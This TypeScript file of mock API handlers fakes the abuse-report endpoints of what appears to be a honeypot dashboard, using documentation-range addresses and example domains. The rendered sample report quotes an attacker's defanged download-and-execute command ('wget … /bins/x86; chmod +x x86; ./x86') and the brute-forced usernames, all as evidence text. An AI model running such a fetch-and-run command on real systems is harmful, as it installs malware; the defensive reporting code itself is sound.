/**
 * MSW handlers for the M22 abuse-report endpoints (docs/design/m22.md section 9.1). Demo data
 * only: addresses are in the documentation ranges, mailboxes are on example.* domains, and the
 * names are invented. State lives for the page load.
 */
import { delay, http, HttpResponse, type RequestHandler } from "msw"
import type {
  AbuseStatus,
  AsnRef,
  BlockedDrafts,
  GuardResult,
  Recipient,
  ReportDetail,
  ReportKind,
  ReportOptions,
  ReportSettings,
  ReportStatus,
  ReportSubject,
  SelfTerm,
  WaitingRecipient,
} from "@/lib/abuse"
import { KIND_LABEL } from "@/lib/abuse"
import { sampleSha } from "./samples"
import { outcomeFor, repliesStatus } from "./replies"

const LATENCY_MS = 140
const HOUR = 3_600_000
const iso = (msAgo: number) => new Date(Date.now() - msAgo).toISOString()

const RECIPIENTS: Recipient[] = [
  {
    id: 1,
    name: "Example Hosting B.V.",
    mailbox: "abuse@example.net",
    source: "rdap",
    muted: false,
  },
  {
    id: 2,
    name: "Example Cloud Ltd",
    mailbox: "abuse-desk@example.net",
    source: "rdap",
    muted: false,
  },
  { id: 3, name: "Sample Transit AS", mailbox: "abuse@example.org", source: "rdap", muted: false },
]

const ASN: Record<number, AsnRef> = {
  64500: { asn: 64500, name: "EXAMPLE-NET" },
  64501: { asn: 64501, name: "EXAMPLE-CLOUD" },
  64502: { asn: 64502, name: "EXAMPLE-CLOUD-2" },
  64503: { asn: 64503, name: "SAMPLE-TRANSIT" },
}

const defaultOptions = (): ReportOptions => ({
  defang: true,
  time_precision: "minute",
  include_usernames: true,
  include_reply_contact: true,
  show_redaction_counts: false,
})

const guardOk: GuardResult = { ok: true, codes: [] }

function subject(
  value: string,
  asn: number,
  hoursAgo: number,
  sessions: number,
  type: ReportSubject["subject_type"] = "ip",
): ReportSubject {
  return {
    subject_type: type,
    value,
    asn,
    network: ASN[asn]?.name ?? null,
    handle: `NET-${value.replaceAll(".", "-")}`,
    sessions,
    events: sessions * 31,
    first_ts: iso((hoursAgo + 2) * HOUR),
    last_ts: iso(hoursAgo * HOUR),
    link: type === "ip" ? `/attacks?src_ip=${value}` : `/malware?q=${encodeURIComponent(value)}`,
  }
}

interface Seed {
  id: string
  kind: ReportKind
  status: ReportStatus
  recipient: number
  asns: number[]
  subjects: ReportSubject[]
  demo?: boolean
  guard?: GuardResult
  ageH: number
  masked?: number
  removed?: number
  previously?: string | null
}

const SEEDS: Seed[] = [
  {
    id: "7b1f3a52-9c0e-4d2a-8f61-1a2b3c4d5e01",
    kind: "attack_source",
    status: "draft",
    recipient: 1,
    asns: [64500],
    subjects: [
      subject("198.51.100.23", 64500, 3, 7),
      subject("198.51.100.24", 64500, 4, 3),
      subject("198.51.100.77", 64500, 5, 2),
    ],
    ageH: 1,
    masked: 2,
    removed: 1,
  },
  {
    id: "c2d9e8f7-1a3b-4c5d-9e0f-2b3c4d5e6f02",
    kind: "payload_host",
    status: "draft",
    recipient: 1,
    asns: [64500],
    subjects: [subject("203.0.113.9", 64500, 6, 5)],
    ageH: 2,
    masked: 1,
    removed: 0,
  },
  {
    id: "a41e5b60-2d7c-4f18-8b93-3c4d5e6f7a03",
    kind: "attack_source",
    status: "draft",
    recipient: 2,
    asns: [64501, 64502],
    subjects: [
      subject("192.0.2.55", 64501, 8, 4),
      subject("192.0.2.81", 64502, 9, 9),
      subject("192.0.2.130", 64502, 12, 2),
      subject("192.0.2.201", 64501, 15, 1),
    ],
    demo: true,
    ageH: 3,
    masked: 3,
    removed: 2,
  },
  {
    id: "5e6f7a80-3b4c-4d5e-8f90-4d5e6f7a8b04",
    kind: "c2",
    status: "draft",
    recipient: 3,
    asns: [64503],
    subjects: [subject("203.0.113.200", 64503, 20, 6)],
    guard: { ok: false, codes: ["project_term", "internal_id"] },
    ageH: 4,
    masked: 0,
    removed: 0,
  },
  {
    id: "9a8b7c6d-5e4f-4a3b-9c2d-5e6f7a8b9c05",
    kind: "attack_source",
    status: "reviewed",
    recipient: 2,
    asns: [64501],
    subjects: [subject("192.0.2.14", 64501, 30, 12), subject("192.0.2.15", 64501, 31, 3)],
    ageH: 20,
    masked: 1,
    removed: 0,
  },
  {
    id: "3c4d5e6f-7a8b-4c9d-8e0f-6f7a8b9c0d06",
    kind: "attack_source",
    status: "sent",
    recipient: 1,
    asns: [64500],
    subjects: [subject("198.51.100.5", 64500, 70, 8)],
    ageH: 60,
    masked: 1,
    removed: 0,
  },
  {
    id: "1d2e3f40-5a6b-4c7d-9e8f-7a8b9c0d1e07",
    kind: "payload_host",
    status: "closed",
    recipient: 3,
    asns: [64503],
    subjects: [subject("203.0.113.31", 64503, 120, 4)],
    ageH: 110,
    masked: 1,
    removed: 0,
    previously: null,
  },
  {
    id: "8f9a0b1c-2d3e-4f50-8a6b-8b9c0d1e2f08",
    kind: "attack_source",
    status: "discarded",
    recipient: 2,
    asns: [64502],
    subjects: [subject("192.0.2.99", 64502, 90, 2)],
    ageH: 85,
    masked: 0,
    removed: 0,
  },
]

export type Row = ReportDetail

/** A value that the fixtures guarantee; keeps the handlers free of non-null assertions. */
function must<T>(v: T | undefined): T {
  if (v === undefined) throw new Error("mock fixture is incomplete")
  return v
}

const settings: ReportSettings = {
  reply_contact: "reports@example.net",
  signature: "Security desk",
  intro: "I run a small research network. The addresses below attacked a machine I monitor.",
  outro: "Please tell me what you find.",
  xarf_user_agent: "desk-reports/1",
  note: "The destination is withheld; source ports are listed so you can match your logs.",
  subject_template: "Abuse report for {network}",
  round_times: true,
  default_options: {
    defang: true,
    include_usernames: true,
    include_reply_contact: true,
    show_redaction_counts: false,
  },
  default_tlp: "green",
  reference_style: "subject",
  revision: 1,
}

function build(s: Seed): Row {
  const recipient = must(RECIPIENTS.find((r) => r.id === s.recipient))
  const times = s.subjects.flatMap((x) => [x.first_ts, x.last_ts]).sort()
  const history: ReportDetail["history"] = [
    { ts: iso((s.ageH + 1) * HOUR), actor: "ingest", from: null, to: "draft" },
  ]
  if (s.status !== "draft")
    history.push({ ts: iso(s.ageH * HOUR), actor: "admin", from: "draft", to: s.status })
  return {
    public_id: s.id,
    kind: s.kind,
    status: s.status,
    demo: s.demo ?? false,
    recipient,
    asns: s.asns.map((a) => must(ASN[a])),
    subject_count: s.subjects.length,
    window_start: must(times[0]),
    window_end: must(times.at(-1)),
    updated_at: iso(s.ageH * HOUR),
    revision: 1,
    guard: s.guard ?? guardOk,
    subjects: s.subjects,
    redaction: { masked: s.masked ?? 0, removed: s.removed ?? 0 },
    options: defaultOptions(),
    notes: null,
    history,
    missing: missingSettings(),
    previously_reported: s.previously ?? null,
    reviewed_at: s.status === "draft" ? null : iso(s.ageH * HOUR),
    sent_at: s.status === "sent" || s.status === "closed" ? iso(s.ageH * HOUR) : null,
    closed_at: s.status === "closed" ? iso(s.ageH * HOUR) : null,
  }
}

export const rows: Row[] = SEEDS.map(build)

const waiting: WaitingRecipient[] = [
  {
    id: 11,
    name: "Test Networks Co",
    asns: [{ asn: 64510, name: "TEST-NETWORKS" }],
    subject_count: 2,
  },
  { id: 12, name: "Placeholder Telecom", asns: [{ asn: 64511, name: null }], subject_count: 1 },
]

const terms: (SelfTerm & { full: string })[] = [
  {
    id: 1,
    kind: "address",
    value: "203.0.•••.•••",
    full: "203.0.113.1",
    source: "learned",
    confirmed: true,
    distinct_sources: 41,
  },
  {
    id: 2,
    kind: "name",
    value: "ho••••••.example.com",
    full: "host.example.com",
    source: "learned",
    confirmed: false,
    distinct_sources: 2,
  },
  {
    id: 3,
    kind: "text",
    value: "my••••••",
    full: "mynetwork",
    source: "manual",
    confirmed: true,
    distinct_sources: 0,
  },
  {
    id: 4,
    kind: "address",
    value: "198.51.•••.•••",
    full: "198.51.100.200",
    source: "sensor",
    confirmed: true,
    distinct_sources: 1,
  },
]
let nextTerm = 5

/** Only the reply contact is required; the wording fields are optional. */
export function missingSettings(): string[] {
  return (settings.reply_contact ?? "").trim() ? [] : ["reply_contact"]
}

export function pub(r: Row): ReportDetail {
  return { ...r, missing: missingSettings() }
}

export function find(id: string): Row | undefined {
  return rows.find((r) => r.public_id === id)
}

const notFound = () =>
  HttpResponse.json({ detail: "Report not found.", code: "not_found" }, { status: 404 })

export function renderBody(r: Row, format: string): { subject: string; body: string; to: string } {
  const round = r.options.time_precision === "minute"
  const t = (s: string) => {
    const d = new Date(s)
    const x = d.toISOString()
    return round ? `${x.slice(0, 16)}Z` : `${x.slice(0, 19)}Z`
  }
  const defang = (s: string) => (r.options.defang ? s.replaceAll(".", "[.]") : s)
  const first = must(r.subjects[0])
  const subjectLine =
    (r.demo ? "DEMO, DO NOT SEND: " : "") +
    (r.subjects.length === 1
      ? `Abuse report: ${KIND_LABEL[r.kind].toLowerCase()} ${first.value} (AS${first.asn})`
      : `Abuse report: ${r.subjects.length} addresses in your network attacked a monitored system (${t(r.window_end).slice(0, 10)})`)
  const lines = r.subjects.map(
    (x) =>
      `${x.value} (AS${x.asn}, ${x.network})\n  ${t(x.first_ts)} to ${t(x.last_ts)}, TCP/22 (ssh)\n  - ${x.events} failed logins${
        r.options.include_usernames ? " (usernames tried: root, admin, ubnt)" : ""
      }\n  - ${t(x.last_ts)} logged in, then ran:\n      cd /tmp; wget hxxp://${defang("203.0.113.9")}/bins/x86; chmod +x x86; ./x86`,
  )
  const intro =
    settings.intro ?? "The addresses below, announced by your network, attacked a monitored system."
  const body = [
    "Hello,",
    "",
    intro,
    "All times are UTC. The destination address is withheld.",
    "",
    lines.join("\n\n"),
    "",
    "Please investigate and stop this activity.",
    "",
    ...(r.options.include_reply_contact && settings.reply_contact
      ? [`Reply contact: ${settings.reply_contact}`]
      : []),
    ...(settings.signature ? [settings.signature] : []),
  ].join("\n")
  if (format === "eml")
    return {
      to: r.recipient.mailbox ?? "",
      subject: subjectLine,
      body: `To: ${r.recipient.mailbox}\nSubject: ${subjectLine}\nMIME-Version: 1.0\nContent-Type: text/plain; charset=utf-8\n\n${body}`,
    }
  if (format === "xarf")
    return {
      to: r.recipient.mailbox ?? "",
      subject: subjectLine,
      body: `${body}\n\n--xarf-boundary\nContent-Type: text/plain; name=report.txt\n\nReported-From: ${settings.reply_contact ?? ""}\nCategory: abuse\nReport-Type: login-attack\nSource: ${first.value}\nSource-Type: ipv4\nAttachment: text/plain\nVersion: 0.2`,
    }
  return { to: r.recipient.mailbox ?? "", subject: subjectLine, body }
}

const counts = (): AbuseStatus["counts"] => {
  const c: AbuseStatus["counts"] = {
    draft: 0,
    reviewed: 0,
    sent: 0,
    closed: 0,
    discarded: 0,
    superseded: 0,
  }
  for (const r of rows) c[r.status]++
  return c
}

/** The open drafts held back by the identity check, by reason (as the server counts them). */
const blockedDrafts = (): BlockedDrafts => {
  const out: BlockedDrafts = { count: 0, reasons: {} }
  for (const r of rows) {
    if (r.status !== "draft" || r.guard.ok) continue
    out.count++
    for (const code of r.guard.codes) out.reasons[code] = (out.reasons[code] ?? 0) + 1
  }
  return out
}

const blocked = (r: Row) =>
  HttpResponse.json(
    {
      detail: "The identity check blocked this report.",
      code: "identity_guard_failed",
      reasons: r.guard.codes,
    },
    { status: 409 },
  )

function bareFile(name: string, text: string, type: string) {
  return new HttpResponse(text, {
    headers: {
      "Content-Type": type,
      "Content-Disposition": `attachment; filename="${name}"`,
      "Cache-Control": "no-store",
    },
  })
}

export const abuseHandlers: RequestHandler[] = [
  http.get("/api/v1/abuse/status", async () => {
    await delay(LATENCY_MS)
    const status: AbuseStatus = {
      enabled: true,
      gate: "open",
      rdap_quota: { used: 42, limit: 1000 },
      self_address_known: true,
      self_address_fresh: true,
      counts: counts(),
      waiting_for_contact: waiting.reduce((n, w) => n + w.subject_count, 0),
      replies: repliesStatus(),
      blocked_drafts: blockedDrafts(),
    }
    return HttpResponse.json(status)
  }),
  http.get("/api/v1/abuse/reports", async ({ request }) => {
    await delay(LATENCY_MS)
    const q = new URL(request.url).searchParams
    const items = rows
      .filter((r) => r.status !== "superseded")
      .filter((r) => !q.get("status") || r.status === q.get("status"))
      .filter((r) => !q.get("kind") || r.kind === q.get("kind"))
      .filter((r) => !q.get("recipient") || r.recipient.id === Number(q.get("recipient")))
      .sort((a, b) => b.updated_at.localeCompare(a.updated_at))
      .map((r) => {
        const d = pub(r)
        return {
          public_id: d.public_id,
          kind: d.kind,
          status: d.status,
          demo: d.demo,
          recipient: d.recipient,
          asns: d.asns,
          subject_count: d.subject_count,
          window_start: d.window_start,
          window_end: d.window_end,
          updated_at: d.updated_at,
          revision: d.revision,
          guard: d.guard,
          outcome: outcomeFor(d.public_id, d.sent_at !== null),
        }
      })
    return HttpResponse.json({ items, next_cursor: null })
  }),
  http.get("/api/v1/abuse/reports/:id/render", async ({ params, request }) => {
    await delay(LATENCY_MS)
    const r = find(String(params.id))
    if (!r) return notFound()
    if (!r.guard.ok) return blocked(r)
    if (missingSettings().length > 0)
      return HttpResponse.json(
        {
          detail: "Set a reply contact in Settings first.",
          code: "settings_incomplete",
          missing: missingSettings(),
        },
        { status: 409 },
      )
    const format = new URL(request.url).searchParams.get("format") ?? "text"
    const m = renderBody(r, format)
    return HttpResponse.json({
      ...m,
      // The real API answers the whole .eml in `body` and no attachments for eml.
      attachments:
        format === "eml"
          ? []
          : [
              { name: "report.txt", media_type: "text/plain", content: "" },
              { name: "evidence.csv", media_type: "text/csv", content: "" },
            ],
      revision: r.revision,
      guard: r.guard,
    })
  }),
  http.get("/api/v1/abuse/reports/:id/download", async ({ params, request }) => {
    await delay(LATENCY_MS)
    const r = find(String(params.id))
    if (!r) return notFound()
    if (!r.guard.ok) return blocked(r)
    const format = new URL(request.url).searchParams.get("format") ?? "txt"
    const short = r.public_id.slice(0, 8)
    if (format === "evidence_csv")
      return bareFile("evidence.csv", "ip,first_seen,last_seen,sessions\n", "text/csv")
    if (format === "xarf_yaml") return bareFile("report.yaml", "Version: 0.2\n", "application/yaml")
    return bareFile(`abuse-${short}.${format}`, renderBody(r, "text").body, "text/plain")
  }),
  http.get("/api/v1/abuse/reports/:id", async ({ params }) => {
    await delay(LATENCY_MS)
    const r = find(String(params.id))
    return r ? HttpResponse.json(pub(r)) : notFound()
  }),
  http.post("/api/v1/abuse/reports/:id/status", async ({ params, request }) => {
    await delay(LATENCY_MS)
    const r = find(String(params.id))
    if (!r) return notFound()
    const b = (await request.json()) as { to: ReportStatus; revision: number; sent_at?: string }
    if (b.revision !== r.revision)
      return HttpResponse.json(
        { detail: "The report changed.", code: "revision_mismatch" },
        { status: 409 },
      )
    const allowed: Record<string, ReportStatus[]> = {
      draft: ["reviewed", "discarded"],
      reviewed: ["sent", "draft", "discarded"],
      sent: ["closed"],
    }
    if (!allowed[r.status]?.includes(b.to))
      return HttpResponse.json({ detail: "No.", code: "invalid_transition" }, { status: 409 })
    if (b.to === "reviewed" && missingSettings().length > 0)
      return HttpResponse.json(
        {
          detail: "Set a reply contact in Settings first.",
          code: "settings_incomplete",
          missing: missingSettings(),
        },
        { status: 409 },
      )
    if (b.to === "sent" && r.demo)
      return HttpResponse.json(
        { detail: "A demo report cannot be sent.", code: "demo_report" },
        { status: 409 },
      )
    r.history.push({ ts: new Date().toISOString(), actor: "admin", from: r.status, to: b.to })
    r.status = b.to
    r.updated_at = new Date().toISOString()
    if (b.to === "reviewed") r.reviewed_at = r.updated_at
    if (b.to === "sent") r.sent_at = b.sent_at ?? r.updated_at
    if (b.to === "closed") r.closed_at = r.updated_at
    return HttpResponse.json(pub(r))
  }),
  http.patch("/api/v1/abuse/reports/:id", async ({ params, request }) => {
    await delay(LATENCY_MS)
    const r = find(String(params.id))
    if (!r) return notFound()
    const b = (await request.json()) as { notes?: string | null; options?: Partial<ReportOptions> }
    if (b.notes !== undefined) r.notes = b.notes
    if (b.options) {
      Object.assign(r.options, b.options)
      r.revision++
    }
    return HttpResponse.json(pub(r))
  }),
  http.post("/api/v1/abuse/reports/:id/regenerate", async ({ params }) => {
    await delay(LATENCY_MS)
    const r = find(String(params.id))
    if (!r) return notFound()
    if (r.status === "reviewed") r.status = "draft"
    r.revision++
    return HttpResponse.json({ requested: true }, { status: 202 })
  }),
  http.get("/api/v1/abuse/recipients", async () => {
    await delay(LATENCY_MS)
    return HttpResponse.json(waiting)
  }),
  http.patch("/api/v1/abuse/recipients/:id", async ({ params }) => {
    await delay(LATENCY_MS)
    const i = waiting.findIndex((w) => w.id === Number(params.id))
    if (i >= 0) waiting.splice(i, 1)
    return HttpResponse.json({ ok: true })
  }),
  http.get("/api/v1/abuse/settings", async () => {
    await delay(LATENCY_MS)
    return HttpResponse.json(settings)
  }),
  http.put("/api/v1/abuse/settings", async ({ request }) => {
    await delay(LATENCY_MS)
    const b = (await request.json()) as ReportSettings
    if (b.revision !== settings.revision)
      return HttpResponse.json(
        { detail: "Settings changed meanwhile.", code: "revision_mismatch" },
        { status: 409 },
      )
    if ((b.reply_contact ?? "").endsWith("@owner.example"))
      return HttpResponse.json(
        {
          detail: "The reply contact is on a domain that belongs to you.",
          code: "identity_guard_failed",
          reasons: ["owner_domain"],
          fields: { reply_contact: ["owner_domain"] },
        },
        { status: 409 },
      )
    Object.assign(settings, b, { revision: settings.revision + 1 })
    return HttpResponse.json(settings)
  }),
  http.get("/api/v1/abuse/self-terms", async ({ request }) => {
    await delay(LATENCY_MS)
    const reveal = new URL(request.url).searchParams.get("reveal") === "true"
    return HttpResponse.json(
      terms.map((t) => ({ ...t, value: reveal ? t.full : t.value, full: undefined })),
    )
  }),
  http.post("/api/v1/abuse/self-terms", async ({ request }) => {
    await delay(LATENCY_MS)
    const b = (await request.json()) as { kind: SelfTerm["kind"]; value: string }
    const t = {
      id: nextTerm++,
      kind: b.kind,
      full: b.value,
      value: `${b.value.slice(0, 2)}••••••`,
      source: "manual" as const,
      confirmed: true,
      distinct_sources: 0,
    }
    terms.push(t)
    return HttpResponse.json(t, { status: 201 })
  }),
  http.patch("/api/v1/abuse/self-terms/:id", async ({ params }) => {
    await delay(LATENCY_MS)
    const t = terms.find((x) => x.id === Number(params.id))
    if (t) t.confirmed = true
    return HttpResponse.json({ ok: true })
  }),
  http.delete("/api/v1/abuse/self-terms/:id", async ({ params }) => {
    await delay(LATENCY_MS)
    const i = terms.findIndex((x) => x.id === Number(params.id))
    if (i >= 0 && terms[i]?.source !== "sensor") terms.splice(i, 1)
    return new HttpResponse(null, { status: 204 })
  }),
  // Sample bundle (§8.4). The third mock sample plays the one the identity check leaves out.
  http.post("/api/v1/abuse/exports/samples", async ({ request }) => {
    await delay(LATENCY_MS)
    const body = (await request.json()) as { sha256?: string[]; password?: string }
    if (!body.password || body.password === "wrong")
      return HttpResponse.json({ detail: "wrong password", code: "reauth_failed" }, { status: 403 })
    const wanted = [...new Set(body.sha256 ?? [])]
    if (wanted.length === 0 || wanted.length > 10)
      return HttpResponse.json({ detail: "1 to 10 samples" }, { status: 422 })
    const excluded = wanted.filter((s) => s === sampleSha(2))
    if (excluded.length === wanted.length)
      return HttpResponse.json(
        {
          detail: "Every sample was left out by the identity check.",
          code: "all_excluded",
          excluded: excluded.map((sha256) => ({ sha256, reasons: ["self_address"] })),
        },
        { status: 409 },
      )
    const headers: Record<string, string> = {
      "Content-Type": "application/zip",
      "Content-Disposition": 'attachment; filename="samples-0a1b2c3d.zip"',
      "Cache-Control": "no-store",
    }
    if (excluded.length) {
      headers["X-Excluded"] = String(excluded.length)
      headers["X-Excluded-Samples"] = excluded.join(",")
    }
    // Not a real archive: demo bytes only.
    return new HttpResponse(new Blob(["demo bundle"], { type: "application/zip" }), { headers })
  }),
  http.get("/api/v1/abuse/exports/:kind", async ({ params }) => {
    await delay(LATENCY_MS)
    const kind = String(params.kind)
    return bareFile(
      `indicators-0a1b2c3d.${kind}.json`,
      JSON.stringify({ note: "demo export", indicators: ["198.51.100.23"] }, null, 2),
      "application/json",
    )
  }),
]
